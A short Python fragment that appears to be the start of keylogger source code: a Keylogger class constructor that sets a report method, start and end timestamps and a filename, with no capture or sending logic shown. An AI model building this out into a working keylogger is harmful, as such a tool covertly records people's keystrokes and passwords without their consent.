from datetime import datetime

class Keylogger:
    def __init__(self, report_method="file"):
        self.report_method = report_method
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.filename = ""
